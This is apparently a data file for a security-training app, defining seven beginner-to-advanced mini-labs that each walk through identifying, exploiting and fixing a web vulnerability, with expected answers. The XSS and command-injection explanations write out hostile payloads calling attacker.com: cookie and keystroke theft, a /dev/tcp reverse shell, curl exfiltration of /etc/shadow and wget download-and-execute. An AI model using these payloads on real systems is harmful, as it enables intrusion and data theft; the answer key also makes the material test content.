import { MiniLabData } from './MiniLab';

export const miniLabs: MiniLabData[] = [
  {
    id: 'sql-injection-login',
    title: 'SQL Injection: Login Bypass',
    category: 'Web Security',
    difficulty: 'Beginner',
    duration: '15-20 min',
    description: 'Learn how SQL injection attacks work by exploiting a vulnerable login form, then secure it using proper techniques.',
    scenario: 'You are a security intern at TechCorp. During a routine security assessment, you discovered that the employee portal login page might be vulnerable to SQL injection. Your task is to identify, exploit, and fix this vulnerability before malicious actors do.',
    points: 150,
    steps: {
      identify: {
        title: 'Identify the Vulnerability',
        description: 'The login form uses a SQL query to authenticate users. Examine the code below and identify what makes it vulnerable to SQL injection.',
        instruction: 'What type of vulnerability is present in this code? Describe the specific issue that allows SQL injection.',
        codeExample: `// Vulnerable Login Query
const query = \`SELECT * FROM users 
  WHERE username = '\${username}' 
  AND password = '\${password}'\`;

// User input is directly concatenated into the SQL query
db.query(query);`,
        expectedAnswer: 'string concatenation',
        hint: 'Look at how user input (username and password) is being inserted into the SQL query. What happens if a user enters special SQL characters?',
        explanation: 'The vulnerability is caused by direct string concatenation of user input into the SQL query. When user-supplied data is concatenated directly into SQL statements without sanitization, attackers can inject malicious SQL code. This is one of the most common and dangerous web vulnerabilities (OWASP Top 10 #1).'
      },
      exploit: {
        title: 'Exploit the Vulnerability',
        description: 'Now that you\'ve identified the vulnerability, craft a payload that would bypass the authentication. Remember, this is in a controlled environment for educational purposes only.',
        instruction: 'What payload would you enter in the username field to bypass authentication? Write the exact input.',
        codeExample: `// The query becomes:
SELECT * FROM users 
  WHERE username = '[YOUR_INPUT]' 
  AND password = 'anything'

// Goal: Make the WHERE clause always true`,
        expectedAnswer: "' OR '1'='1",
        hint: 'You need to close the username string and add a condition that\'s always true. Think about using OR with a condition like 1=1.',
        explanation: `The payload \' OR \'1\'=\'1 works because:
1. The single quote (') closes the username string
2. OR introduces a new condition
3. '1'='1' is always true
4. This makes the entire WHERE clause true, returning all users

The final query becomes:
SELECT * FROM users WHERE username = '' OR '1'='1' AND password = 'anything'

Since OR has lower precedence, this returns all rows where '1'='1' (which is always true), bypassing authentication entirely.`
      },
      fix: {
        title: 'Secure the Application',
        description: 'You\'ve successfully demonstrated the vulnerability. Now implement the proper fix to prevent SQL injection attacks.',
        instruction: 'What is the primary technique to prevent SQL injection in this scenario? Name the specific programming pattern.',
        codeExample: `// INSECURE (current):
const query = \`SELECT * FROM users WHERE username = '\${username}'\`;

// SECURE (your fix):
// Hint: Parameters should be passed separately from the query`,
        expectedAnswer: 'prepared statements',
        hint: 'The solution involves separating SQL code from data. Look up "parameterized queries" or "prepared statements".',
        explanation: `The correct fix is to use Prepared Statements (Parameterized Queries):

// Secure Implementation:
const query = 'SELECT * FROM users WHERE username = ? AND password = ?';
db.query(query, [username, password]);

Why this works:
1. The SQL structure is defined first with placeholders (?)
2. User data is passed separately as parameters
3. The database treats parameters as data, never as SQL code
4. Even if someone enters ' OR '1'='1, it's treated as a literal string

Additional security measures:
- Input validation (whitelist allowed characters)
- Least privilege database accounts
- Web Application Firewall (WAF)
- Regular security audits`
      }
    }
  },
  {
    id: 'phishing-analysis',
    title: 'Phishing Email Analysis',
    category: 'Social Engineering',
    difficulty: 'Beginner',
    duration: '10-15 min',
    description: 'Learn to identify and analyze phishing emails by examining suspicious indicators, email headers, and implementing user awareness strategies.',
    scenario: 'An employee at your company received a suspicious email claiming to be from the IT department asking them to reset their password. Your SOC team has forwarded this email for analysis. Determine if this is a phishing attempt and recommend appropriate actions.',
    points: 100,
    steps: {
      identify: {
        title: 'Identify Suspicious Indicators',
        description: 'Examine this email and identify the red flags that suggest it might be a phishing attempt.',
        instruction: 'List the main suspicious indicator in this email that suggests phishing (focus on the sender domain).',
        codeExample: `From: IT Support <support@techcorp-security.net>
To: employee@techcorp.com
Subject: URGENT: Password Expires in 24 Hours!

Dear Valued Employee,

Your password will expire in 24 hours. Click the link below 
immediately to avoid losing access to your account:

https://techcorp-login.suspicious-domain.com/reset

This is an automated message. Do not reply.

IT Support Team
TechCorp Industries`,
        expectedAnswer: 'domain mismatch',
        hint: 'Compare the sender\'s email domain with the company\'s actual domain. Also look at where the link actually goes.',
        explanation: `Key Phishing Indicators Identified:

1. **Domain Mismatch**: Sender uses "techcorp-security.net" instead of "techcorp.com"
2. **Suspicious Link**: URL goes to "suspicious-domain.com", not the real company site
3. **Urgency Tactics**: "URGENT" and "24 hours" create pressure to act quickly
4. **Generic Greeting**: "Dear Valued Employee" instead of using the person's name
5. **No Contact Information**: Legitimate IT would include phone/ticket numbers

These are classic social engineering techniques designed to bypass rational thinking.`
      },
      exploit: {
        title: 'Analyze Email Headers',
        description: 'Deep dive into the email headers to gather more evidence. Headers reveal the true origin of emails.',
        instruction: 'Based on the SPF check result, what is the authentication status of this email? (pass/fail/none)',
        codeExample: `Email Headers:
Return-Path: <bounce@mail-server.suspicious-domain.com>
Received: from mail-server.suspicious-domain.com (192.168.1.100)
Authentication-Results: 
  spf=fail (sender IP not authorized)
  dkim=none (no signature)
  dmarc=fail (policy rejection)
X-Originating-IP: 192.168.1.100
Date: Mon, 6 Jan 2025 09:30:00 +0000`,
        expectedAnswer: 'fail',
        hint: 'Look at the Authentication-Results header. SPF (Sender Policy Framework) checks if the sending server is authorized to send emails for that domain.',
        explanation: `Header Analysis Results:

**SPF (Sender Policy Framework): FAIL**
- The sending IP (192.168.1.100) is not authorized to send emails for the claimed domain
- This is a major red flag indicating spoofing

**DKIM (DomainKeys Identified Mail): NONE**
- No cryptographic signature present
- Legitimate corporate emails typically have DKIM signatures

**DMARC (Domain-based Message Authentication): FAIL**
- The email fails the domain's authentication policy
- Many email providers would quarantine or reject this

**Return-Path Mismatch:**
- Return-Path shows "suspicious-domain.com"
- This differs from the displayed "From" address

These header failures confirm this is a spoofed phishing email.`
      },
      fix: {
        title: 'Implement Mitigation',
        description: 'Now recommend comprehensive mitigation strategies to protect the organization from such attacks.',
        instruction: 'What is the primary technical email authentication protocol that organizations should implement to prevent domain spoofing?',
        codeExample: `Mitigation Checklist:
□ Technical Controls
  - Email authentication protocols (???)
  - Email filtering and sandboxing
  - Link analysis and URL rewriting

□ User Awareness
  - Security awareness training
  - Simulated phishing exercises
  - Clear reporting procedures

□ Incident Response
  - Block sender domain
  - Search for similar emails
  - Alert affected users`,
        expectedAnswer: 'dmarc',
        hint: 'This protocol builds on SPF and DKIM and provides policy enforcement. It tells receiving servers what to do when authentication fails.',
        explanation: `Complete Mitigation Strategy:

**Technical Controls (DMARC as Primary):**
DMARC (Domain-based Message Authentication, Reporting & Conformance) is essential:
- Combines SPF and DKIM verification
- Provides policy enforcement (none/quarantine/reject)
- Enables reporting for visibility

Implementation: Add DNS TXT record:
_dmarc.techcorp.com: "v=DMARC1; p=reject; rua=mailto:dmarc@techcorp.com"

**Additional Technical Measures:**
- Advanced email filtering (sandboxing)
- URL rewriting and click-time analysis
- External email banners/warnings

**User Awareness Program:**
- Regular phishing simulations
- Quick reporting mechanisms (e.g., "Report Phish" button)
- Recognition of social engineering tactics

**Incident Response:**
- Immediate sender domain blocking
- Organization-wide alert
- Password reset for any who clicked
- Post-incident analysis and training update`
      }
    }
  },
  {
    id: 'xss-stored',
    title: 'Stored XSS Attack',
    category: 'Web Security',
    difficulty: 'Intermediate',
    duration: '15-20 min',
    description: 'Discover and exploit a stored cross-site scripting vulnerability in a comment section, then implement proper sanitization.',
    scenario: 'A bug bounty hunter reported that the company blog\'s comment section might be vulnerable to stored XSS. Users can post comments that are displayed to all visitors. Your job is to verify this vulnerability and secure the application.',
    points: 175,
    steps: {
      identify: {
        title: 'Identify the Vulnerability',
        description: 'Examine how the comment system handles and displays user input. Identify what makes it vulnerable to XSS attacks.',
        instruction: 'What dangerous React property is being used to render comments that enables XSS?',
        codeExample: `// Comment Display Component
const CommentSection = ({ comments }) => {
  return (
    <div className="comments">
      {comments.map(comment => (
        <div key={comment.id} className="comment">
          <strong>{comment.author}</strong>
          <div 
            dangerouslySetInnerHTML={{ __html: comment.text }}
          />
        </div>
      ))}
    </div>
  );
};

// Comment is stored and retrieved from database as-is`,
        expectedAnswer: 'dangerouslySetInnerHTML',
        hint: 'Look at how the comment.text is being rendered. There\'s a React property that explicitly says it\'s dangerous in its name.',
        explanation: `The vulnerability exists because of **dangerouslySetInnerHTML**:

Why it's dangerous:
1. Renders raw HTML directly into the DOM
2. Any HTML/JavaScript in the comment will execute
3. Stored XSS is persistent - affects all users who view the page

Impact of Stored XSS:
- Session hijacking (stealing cookies)
- Account takeover
- Malware distribution
- Defacement
- Keylogging

This is called "Stored" XSS because the malicious payload is saved in the database and served to every visitor.`
      },
      exploit: {
        title: 'Craft an XSS Payload',
        description: 'Create a proof-of-concept payload that demonstrates the XSS vulnerability. In real bug bounties, you\'d use an alert() to prove the vulnerability.',
        instruction: 'Write a simple XSS payload using a script tag that would display an alert box saying "XSS".',
        codeExample: `// When you post a comment with HTML/JS, it gets stored:
POST /api/comments
{
  "author": "Attacker",
  "text": "[YOUR_PAYLOAD_HERE]"
}

// Then rendered for all users:
<div dangerouslySetInnerHTML={{ __html: "[YOUR_PAYLOAD_HERE]" }} />`,
        expectedAnswer: '<script>alert',
        hint: 'The simplest XSS payload uses a script tag with JavaScript inside. For proof-of-concept, security researchers use alert().',
        explanation: `Basic XSS Payload: <script>alert('XSS')</script>

When stored in the database and rendered with dangerouslySetInnerHTML, this script executes in every visitor's browser.

More sophisticated payloads could:
1. Steal cookies: <script>fetch('https://attacker.com/steal?c='+document.cookie)</script>
2. Capture keystrokes: <script>document.onkeypress=function(e){fetch('https://attacker.com/log?k='+e.key)}</script>
3. Redirect users: <script>location='https://phishing-site.com'</script>
4. Deface the page: <script>document.body.innerHTML='<h1>Hacked!</h1>'</script>

Note: Other tags also work: <img src=x onerror=alert('XSS')>`
      },
      fix: {
        title: 'Implement Secure Rendering',
        description: 'Fix the vulnerability by implementing proper output encoding and sanitization.',
        instruction: 'Instead of using dangerouslySetInnerHTML, what should you use to safely render user text content in React?',
        codeExample: `// INSECURE:
<div dangerouslySetInnerHTML={{ __html: comment.text }} />

// SECURE:
// Option 1: Use React's default escaping
// Option 2: Use a sanitization library like DOMPurify
// Option 3: Use markdown parser with sanitization

// If HTML is needed, sanitize first:
import DOMPurify from 'dompurify';
const clean = DOMPurify.sanitize(comment.text);`,
        expectedAnswer: 'text content',
        hint: 'React automatically escapes content when you render it normally using curly braces {}. Just render the text directly without dangerouslySetInnerHTML.',
        explanation: `Secure Solution - Use React's Default Text Rendering:

// Simply render text directly - React escapes HTML automatically
<div className="comment">
  <strong>{comment.author}</strong>
  <p>{comment.text}</p>
</div>

React automatically converts < to &lt;, > to &gt;, etc.

If Rich Text is Required, Use DOMPurify:
import DOMPurify from 'dompurify';

const sanitizedHTML = DOMPurify.sanitize(comment.text, {
  ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a'],
  ALLOWED_ATTR: ['href']
});

<div dangerouslySetInnerHTML={{ __html: sanitizedHTML }} />

Additional Security Measures:
- Content Security Policy (CSP) headers
- Input validation on server-side
- HttpOnly cookies to protect sessions
- Regular security testing`
      }
    }
  },
  {
    id: 'broken-auth',
    title: 'Broken Authentication',
    category: 'Access Control',
    difficulty: 'Intermediate',
    duration: '15-20 min',
    description: 'Identify and exploit weak authentication mechanisms, then implement secure password policies and session management.',
    scenario: 'During a penetration test, you noticed the client application has several authentication weaknesses. The login system might be vulnerable to brute force attacks and uses weak session management. Demonstrate the issues and provide remediation.',
    points: 175,
    steps: {
      identify: {
        title: 'Identify Authentication Weaknesses',
        description: 'Examine the login implementation and identify security weaknesses in the authentication mechanism.',
        instruction: 'What critical security feature is missing that would prevent automated brute force attacks?',
        codeExample: `// Login Endpoint
app.post('/login', async (req, res) => {
  const { username, password } = req.body;
  
  const user = await db.findUser(username);
  
  if (user && user.password === password) {
    // Create session
    const sessionId = Math.random().toString(36);
    res.cookie('session', sessionId);
    return res.json({ success: true });
  }
  
  return res.status(401).json({ error: 'Invalid credentials' });
});`,
        expectedAnswer: 'rate limiting',
        hint: 'Think about what stops an attacker from trying thousands of password combinations. What mechanism limits the number of attempts?',
        explanation: `Critical Authentication Weaknesses Identified:

1. **No Rate Limiting** - Attackers can try unlimited passwords
   - Enables brute force attacks
   - Credential stuffing possible

2. **Plain Text Password Comparison**
   - Passwords should be hashed (bcrypt, argon2)
   - Comparing plaintext is a major security flaw

3. **Weak Session ID Generation**
   - Math.random() is not cryptographically secure
   - Session IDs are predictable

4. **No Account Lockout**
   - Failed attempts don't trigger any protection
   - No alerting on suspicious activity

5. **Missing Secure Cookie Flags**
   - No HttpOnly, Secure, or SameSite flags
   - Cookies vulnerable to theft`
      },
      exploit: {
        title: 'Demonstrate the Attack',
        description: 'Show how an attacker could exploit the lack of rate limiting to perform a brute force attack.',
        instruction: 'In a brute force attack, what is the common list of passwords attackers try first called?',
        codeExample: `// Brute Force Script Example
const commonPasswords = [
  'password', '123456', 'password123', 
  'admin', 'letmein', 'welcome',
  'qwerty', 'abc123', 'monkey',
  // Top 10,000 passwords from breaches...
];

async function bruteForce(username) {
  for (const password of commonPasswords) {
    const response = await fetch('/login', {
      method: 'POST',
      body: JSON.stringify({ username, password })
    });
    
    if (response.ok) {
      console.log(\`Found password: \${password}\`);
      break;
    }
    // No rate limiting = unlimited attempts!
  }
}`,
        expectedAnswer: 'wordlist',
        hint: 'Attackers don\'t try random passwords - they use lists of commonly used passwords compiled from data breaches.',
        explanation: `Brute Force Attack Mechanics:

**Wordlist Attack:**
Attackers use wordlists - collections of common passwords from data breaches:
- rockyou.txt: 14+ million passwords
- SecLists: Categorized password lists
- Custom lists based on target (company names, products)

**Attack Speed Without Rate Limiting:**
- Simple script: 100+ attempts/second
- With threading: 1000+ attempts/second
- Distributed: Millions of attempts possible

**Credential Stuffing:**
Using username:password pairs from other breaches:
- People reuse passwords across sites
- Automated tools test stolen credentials
- High success rate (0.5-2%)

**Time to Crack Common Passwords:**
- "password": Instant (top of every list)
- "Summer2024!": Minutes (follows common patterns)
- Random 12+ chars: Practically impossible`
      },
      fix: {
        title: 'Implement Secure Authentication',
        description: 'Implement proper security controls to protect the authentication system.',
        instruction: 'What password hashing algorithm is recommended for securely storing passwords (hint: it\'s adaptive and has a work factor)?',
        codeExample: `// Secure Implementation Needed:

// 1. Rate Limiting
const rateLimit = require('express-rate-limit');
const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 5, // 5 attempts per window
  message: 'Too many login attempts'
});

// 2. Password Hashing
const bcrypt = require('???');
const hashedPassword = await bcrypt.hash(password, 12);

// 3. Secure Session
const crypto = require('crypto');
const sessionId = crypto.randomBytes(32).toString('hex');`,
        expectedAnswer: 'bcrypt',
        hint: 'This algorithm is specifically designed for password hashing. It automatically handles salting and has a configurable cost factor.',
        explanation: `Secure Authentication Implementation:

**1. Password Hashing with Bcrypt:**
const bcrypt = require('bcrypt');

// Registration
const hashedPassword = await bcrypt.hash(password, 12);
await db.saveUser({ username, password: hashedPassword });

// Login
const isValid = await bcrypt.compare(inputPassword, user.hashedPassword);

**2. Rate Limiting:**
app.post('/login', loginLimiter, async (req, res) => {
  // Max 5 attempts per 15 minutes per IP
});

**3. Account Lockout:**
if (failedAttempts >= 5) {
  await lockAccount(username, 30 * 60 * 1000); // 30 min
  notifySecurityTeam(username);
}

**4. Secure Sessions:**
const sessionId = crypto.randomBytes(32).toString('hex');
res.cookie('session', sessionId, {
  httpOnly: true,    // No JavaScript access
  secure: true,      // HTTPS only
  sameSite: 'strict' // CSRF protection
});

**5. Additional Measures:**
- Multi-factor authentication (MFA)
- Password complexity requirements
- Breach detection (haveibeenpwned API)
- Security logging and monitoring`
      }
    }
  },
  {
    id: 'csrf-attack',
    title: 'Cross-Site Request Forgery (CSRF)',
    category: 'Web Security',
    difficulty: 'Intermediate',
    duration: '15-20 min',
    description: 'Understand how CSRF attacks trick users into performing unwanted actions, then implement proper token-based protection.',
    scenario: 'A banking application allows users to transfer money via a simple POST request. An attacker discovered that the application doesn\'t verify if the request was initiated by the actual user. Your task is to demonstrate this vulnerability and implement proper CSRF protection.',
    points: 175,
    steps: {
      identify: {
        title: 'Identify the Vulnerability',
        description: 'Examine the money transfer endpoint and identify what makes it vulnerable to CSRF attacks.',
        instruction: 'What security mechanism is missing from this endpoint that would verify the request originated from the legitimate application?',
        codeExample: `// Money Transfer Endpoint
app.post('/transfer', isAuthenticated, async (req, res) => {
  const { toAccount, amount } = req.body;
  const fromAccount = req.user.accountId;
  
  // Transfer is processed using only session cookie for auth
  await db.transfer(fromAccount, toAccount, amount);
  
  res.json({ success: true, message: 'Transfer complete' });
});

// The session cookie is automatically sent by the browser
// on ANY request to this domain...`,
        expectedAnswer: 'csrf token',
        hint: 'The browser automatically sends cookies with every request. What additional token should be required to prove the request came from the legitimate form?',
        explanation: `CSRF Vulnerability Analysis:

**Why This Is Vulnerable:**
1. The endpoint only relies on session cookies for authentication
2. Browsers automatically send cookies with every request to the domain
3. No verification that the request came from the actual application
4. An attacker can craft a request on their site that targets this endpoint

**How CSRF Works:**
1. User is logged into bank (has valid session cookie)
2. User visits attacker's malicious website
3. Attacker's page makes a hidden request to the bank
4. Browser includes the session cookie automatically
5. Bank processes the request as if user initiated it

**Impact:**
- Unauthorized money transfers
- Password changes
- Email address changes
- Any state-changing operation`
      },
      exploit: {
        title: 'Craft a CSRF Attack',
        description: 'Create a proof-of-concept that demonstrates how an attacker could exploit this vulnerability from a malicious website.',
        instruction: 'What HTML element would an attacker use to automatically submit a hidden form when the victim visits their page?',
        codeExample: `<!-- Attacker's Malicious Page: evil-site.com/free-prize.html -->
<!DOCTYPE html>
<html>
<head><title>Congratulations! You Won!</title></head>
<body>
  <h1>🎉 Click to Claim Your Prize!</h1>
  
  <!-- Hidden form targeting the bank -->
  <form id="csrf-form" action="https://bank.com/transfer" method="POST">
    <input type="hidden" name="toAccount" value="ATTACKER-ACCOUNT" />
    <input type="hidden" name="amount" value="10000" />
  </form>
  
  <script>
    // Auto-submit when page loads
    document.[???].submit();
  </script>
</body>
</html>`,
        expectedAnswer: 'getElementById',
        hint: 'The attacker needs to select the form element by its ID and then call submit() on it.',
        explanation: `CSRF Attack Demonstration:

**The Attack Page:**
<script>
  document.getElementById('csrf-form').submit();
</script>

**Attack Flow:**
1. Attacker sends phishing email: "Click here to claim your prize!"
2. Victim (logged into bank) clicks the link
3. Malicious page loads and auto-submits the hidden form
4. Browser sends POST to bank.com WITH the victim's cookies
5. Bank transfers $10,000 to attacker's account

**Why This Works:**
- Same-origin policy doesn't prevent form submissions
- Cookies are sent automatically by the browser
- The bank has no way to know this wasn't initiated by the user

**Variations:**
- Image tag: <img src="https://bank.com/transfer?to=attacker&amount=10000">
- XHR/Fetch (blocked by CORS, but form submission isn't)
- Iframe with auto-submitting form`
      },
      fix: {
        title: 'Implement CSRF Protection',
        description: 'Implement proper CSRF protection to ensure requests originate from the legitimate application.',
        instruction: 'What attribute should be set on cookies to prevent them from being sent on cross-site requests?',
        codeExample: `// CSRF Protection Implementation

// 1. Generate CSRF token per session
const csrfToken = crypto.randomBytes(32).toString('hex');
session.csrfToken = csrfToken;

// 2. Include token in forms
<form action="/transfer" method="POST">
  <input type="hidden" name="_csrf" value="{{csrfToken}}" />
  <!-- other fields -->
</form>

// 3. Verify token on server
app.post('/transfer', (req, res) => {
  if (req.body._csrf !== req.session.csrfToken) {
    return res.status(403).json({ error: 'Invalid CSRF token' });
  }
  // Process transfer...
});

// 4. Set cookie attribute: SameSite=???`,
        expectedAnswer: 'strict',
        hint: 'This cookie attribute tells the browser to never send the cookie on cross-site requests. The strictest setting is...',
        explanation: `Complete CSRF Protection:

**1. CSRF Tokens (Primary Defense):**
// Server-side middleware
app.use(csrfProtection);

// Include in every form
<input type="hidden" name="_csrf" value="{{csrfToken}}" />

// For AJAX, include in header
headers: { 'X-CSRF-Token': csrfToken }

**2. SameSite Cookie Attribute:**
res.cookie('session', sessionId, {
  httpOnly: true,
  secure: true,
  sameSite: 'strict'  // Prevents cross-site cookie sending
});

- 'strict': Never sent cross-site (best protection)
- 'lax': Sent on navigation, not on POST (default)
- 'none': Always sent (requires Secure flag)

**3. Additional Measures:**
- Verify Origin/Referer headers
- Re-authenticate for sensitive actions
- Use custom request headers (AJAX only)
- Short session timeouts

**Defense in Depth:**
Combine all methods for maximum protection!`
      }
    }
  },
  {
    id: 'privilege-escalation',
    title: 'Privilege Escalation via IDOR',
    category: 'Access Control',
    difficulty: 'Intermediate',
    duration: '20-25 min',
    description: 'Discover an Insecure Direct Object Reference (IDOR) vulnerability that allows horizontal and vertical privilege escalation.',
    scenario: 'You are testing an HR portal where employees can view their own profile and salary information. You suspect that the authorization checks might be insufficient, potentially allowing users to access other employees\' data or even admin functions.',
    points: 200,
    steps: {
      identify: {
        title: 'Identify the Vulnerability',
        description: 'Examine the API endpoint for viewing user profiles and identify the access control weakness.',
        instruction: 'What type of vulnerability exists when user-supplied IDs are used to access resources without proper authorization checks?',
        codeExample: `// User Profile Endpoint
app.get('/api/users/:userId/profile', isAuthenticated, async (req, res) => {
  const { userId } = req.params;
  
  // Fetches profile based on URL parameter
  const profile = await db.getUserProfile(userId);
  
  if (!profile) {
    return res.status(404).json({ error: 'User not found' });
  }
  
  // Returns full profile including salary, SSN, etc.
  res.json(profile);
});

// Current user ID: 1001
// URL: /api/users/1001/profile`,
        expectedAnswer: 'idor',
        hint: 'The endpoint uses a user-supplied ID directly without checking if the requesting user is authorized to access that specific resource. This is called Insecure Direct Object Reference.',
        explanation: `IDOR (Insecure Direct Object Reference) Vulnerability:

**What's Wrong:**
1. The endpoint accepts any userId parameter
2. It only checks if user is authenticated (isAuthenticated)
3. It does NOT verify if the authenticated user should access that userId
4. Any logged-in user can view ANY user's profile

**Types of IDOR:**
- Horizontal: Access other users at same privilege level
- Vertical: Access admin/higher privilege resources

**Real-World Impact:**
- Data breach of all employee records
- Salary information disclosure
- PII exposure (SSN, addresses, etc.)
- Potential identity theft

**This is OWASP Top 10 #1:**
Broken Access Control - the most critical web vulnerability category.`
      },
      exploit: {
        title: 'Exploit the Vulnerability',
        description: 'Demonstrate how an attacker could exploit this IDOR to access unauthorized data.',
        instruction: 'If your user ID is 1001, what simple change would you make to the URL to try accessing another user\'s profile?',
        codeExample: `// You are logged in as User ID: 1001
// Your profile URL: /api/users/1001/profile

// Testing for IDOR...
// Step 1: Access your own profile (authorized)
GET /api/users/1001/profile  ✓ Returns your data

// Step 2: Try accessing another user
GET /api/users/???/profile   

// Step 3: Try accessing admin (user ID 1)
GET /api/users/1/profile

// Response might include:
{
  "id": 1,
  "name": "Admin User",
  "role": "administrator",
  "salary": 250000,
  "ssn": "123-45-6789"
}`,
        expectedAnswer: '1002',
        hint: 'Just increment or decrement the user ID number to try accessing adjacent user accounts.',
        explanation: `IDOR Exploitation Techniques:

**Basic Enumeration:**
- Increment ID: 1001 → 1002, 1003, 1004...
- Decrement ID: 1001 → 1000, 999, 998...
- Try common admin IDs: 1, 0, admin, root

**Automated Enumeration:**
for id in range(1, 10000):
    response = requests.get(f'/api/users/{id}/profile', 
                           cookies=session_cookies)
    if response.ok:
        save_data(response.json())

**What Attackers Find:**
- Other employees' profiles (horizontal escalation)
- Admin accounts (vertical escalation)
- Service accounts with elevated privileges
- Deleted/inactive accounts with sensitive data

**Beyond Simple IDs:**
- UUIDs: Sometimes predictable or leaked
- Encoded IDs: Base64 decode, modify, re-encode
- Hashed IDs: If algorithm is known, can be reversed`
      },
      fix: {
        title: 'Implement Proper Authorization',
        description: 'Implement proper authorization checks to prevent unauthorized access.',
        instruction: 'What authorization pattern checks if the requesting user owns the resource OR has a specific role that grants access?',
        codeExample: `// Secure Implementation

app.get('/api/users/:userId/profile', isAuthenticated, async (req, res) => {
  const { userId } = req.params;
  const requestingUser = req.user;
  
  // Authorization Check - What pattern is this?
  const isOwner = requestingUser.id === parseInt(userId);
  const isAdmin = requestingUser.role === 'admin';
  const isHR = requestingUser.role === 'hr';
  
  if (!isOwner && !isAdmin && !isHR) {
    return res.status(403).json({ 
      error: 'Access denied' 
    });
  }
  
  // Only now fetch and return the profile
  const profile = await db.getUserProfile(userId);
  res.json(profile);
});`,
        expectedAnswer: 'rbac',
        hint: 'This pattern uses roles (admin, HR, etc.) combined with ownership to determine access. It\'s called Role-Based Access Control.',
        explanation: `Secure Authorization Implementation:

**RBAC (Role-Based Access Control):**
const checkAccess = (user, resourceUserId, requiredRoles) => {
  const isOwner = user.id === resourceUserId;
  const hasRole = requiredRoles.includes(user.role);
  return isOwner || hasRole;
};

// Usage
if (!checkAccess(req.user, userId, ['admin', 'hr'])) {
  return res.status(403).json({ error: 'Forbidden' });
}

**Additional Security Measures:**

1. **Use Indirect References:**
// Instead of real IDs, use mapped references
const userMap = { 'abc123': 1001, 'def456': 1002 };
// Attacker can't guess valid references

2. **Implement Field-Level Security:**
// Regular users see limited fields
const publicProfile = { name, title, department };
// Admins see all fields
const fullProfile = { ...publicProfile, salary, ssn };

3. **Audit Logging:**
logger.info({
  action: 'profile_access',
  requestor: req.user.id,
  target: userId,
  authorized: isAuthorized
});

4. **Rate Limiting:**
Prevent mass enumeration attempts.`
      }
    }
  },
  {
    id: 'command-injection',
    title: 'OS Command Injection',
    category: 'Server Security',
    difficulty: 'Advanced',
    duration: '20-25 min',
    description: 'Identify and exploit a command injection vulnerability in a server-side application, then implement proper input handling.',
    scenario: 'A web application provides a network diagnostic tool that lets administrators ping servers. You suspect the implementation might be vulnerable to command injection, which could allow attackers to execute arbitrary commands on the server.',
    points: 225,
    steps: {
      identify: {
        title: 'Identify the Vulnerability',
        description: 'Examine the server-side code that handles the ping functionality and identify the security flaw.',
        instruction: 'What dangerous function is being used that allows shell command execution with user input?',
        codeExample: `// Network Diagnostic Endpoint
app.post('/api/admin/ping', isAdmin, async (req, res) => {
  const { host } = req.body;
  
  // Execute ping command
  const { exec } = require('child_process');
  
  exec(\`ping -c 4 \${host}\`, (error, stdout, stderr) => {
    if (error) {
      return res.status(500).json({ error: stderr });
    }
    res.json({ output: stdout });
  });
});

// Request: { "host": "google.com" }
// Executes: ping -c 4 google.com`,
        expectedAnswer: 'exec',
        hint: 'Look at the child_process method being used. This function executes commands in a shell, making it dangerous with user input.',
        explanation: `Command Injection Vulnerability:

**Why exec() is Dangerous:**
1. Executes commands in a shell (/bin/sh)
2. Shell interprets special characters
3. User input is directly concatenated
4. Attackers can inject additional commands

**Shell Metacharacters:**
- ; (command separator)
- | (pipe)
- && and || (command chaining)
- \` \` and $() (command substitution)
- > and >> (output redirection)

**Impact of Command Injection:**
- Full server compromise
- Data exfiltration
- Malware installation
- Lateral movement in network
- Complete system takeover

**This is OWASP Top 10 #3:**
Injection flaws are among the most critical vulnerabilities.`
      },
      exploit: {
        title: 'Exploit Command Injection',
        description: 'Craft a payload that demonstrates the command injection vulnerability.',
        instruction: 'What shell operator would you use after the hostname to add a second command that reads /etc/passwd?',
        codeExample: `// Normal Request:
{ "host": "google.com" }
// Executes: ping -c 4 google.com

// Malicious Request:
{ "host": "google.com [???] cat /etc/passwd" }
// Executes: ping -c 4 google.com [???] cat /etc/passwd

// Common injection payloads:
// ; - Execute second command after first
// | - Pipe first command output to second
// && - Execute second if first succeeds
// || - Execute second if first fails
// \`cmd\` - Execute cmd and use output`,
        expectedAnswer: ';',
        hint: 'In shell scripting, this character is used to separate multiple commands on a single line, allowing each to execute independently.',
        explanation: `Command Injection Payloads:

**Basic Payload:**
Host: google.com; cat /etc/passwd

Executed: ping -c 4 google.com; cat /etc/passwd

**Advanced Payloads:**

1. **Reverse Shell:**
; bash -i >& /dev/tcp/attacker.com/4444 0>&1

2. **Data Exfiltration:**
; curl attacker.com/steal?data=$(cat /etc/shadow | base64)

3. **Download and Execute:**
; wget attacker.com/malware.sh -O /tmp/x && chmod +x /tmp/x && /tmp/x

4. **Blind Injection (no output):**
; sleep 10  # Confirm injection via time delay
; ping attacker.com  # Confirm via network traffic

**Obfuscation Techniques:**
; c'a't /etc/passwd  # Quote insertion
; cat /etc/pas?wd   # Wildcard
; $(echo Y2F0) /etc/passwd  # Base64 encoding`
      },
      fix: {
        title: 'Implement Secure Command Handling',
        description: 'Implement proper security measures to prevent command injection.',
        instruction: 'What child_process method should be used instead of exec() to prevent shell interpretation of special characters?',
        codeExample: `// INSECURE:
exec(\`ping -c 4 \${host}\`);

// SECURE - Use ??? instead of exec:
const { ??? } = require('child_process');

// Pass command and arguments separately
???('ping', ['-c', '4', host], (error, stdout, stderr) => {
  // Arguments are passed directly, not interpreted by shell
});

// Additional validations needed:
// - Whitelist allowed characters
// - Validate host format
// - Use allowlist of permitted hosts`,
        expectedAnswer: 'execFile',
        hint: 'This method executes a file directly without spawning a shell. Arguments are passed as an array, not interpreted.',
        explanation: `Secure Command Execution:

**Use execFile/spawn Instead of exec:**
const { execFile } = require('child_process');

execFile('ping', ['-c', '4', host], (error, stdout) => {
  // Arguments passed as array, no shell interpretation
  // ; | && etc. are treated as literal characters
});

**Input Validation:**
const validateHost = (host) => {
  // Only allow valid hostnames/IPs
  const hostnameRegex = /^[a-zA-Z0-9][a-zA-Z0-9-]{0,61}[a-zA-Z0-9](?:\\.[a-zA-Z]{2,})+$/;
  const ipRegex = /^(?:[0-9]{1,3}\\.){3}[0-9]{1,3}$/;
  return hostnameRegex.test(host) || ipRegex.test(host);
};

if (!validateHost(host)) {
  return res.status(400).json({ error: 'Invalid host format' });
}

**Allowlist Approach:**
const allowedHosts = ['google.com', 'internal-server.local'];
if (!allowedHosts.includes(host)) {
  return res.status(403).json({ error: 'Host not permitted' });
}

**Defense in Depth:**
- Run with minimal privileges
- Use containers/sandboxing
